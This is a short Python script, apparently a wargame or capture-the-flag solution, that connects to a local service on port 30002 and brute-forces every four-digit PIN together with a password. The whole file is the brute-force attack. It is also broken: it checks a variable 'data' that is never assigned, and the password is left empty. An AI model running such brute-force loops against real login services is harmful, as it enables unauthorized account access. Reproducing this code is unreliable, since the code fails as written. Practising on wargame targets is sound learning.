import socket

#setting up target
target_host = "localhost"
target_port = 30002
opin = 0
pw = ""

#setting up connections
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
response = client.recv(4096)
print(response.decode())

#loops pin number starting from 0 - 9999
while opin < 10000:
    pin = str(opin)
    combo = pw + " " + pin + "\n"
    client.sendall(combo.encode())
    opin += 1

    if (b"Wrong!") in data:
        print("error", combo)

    else:
        print(data, combo)
        break
    
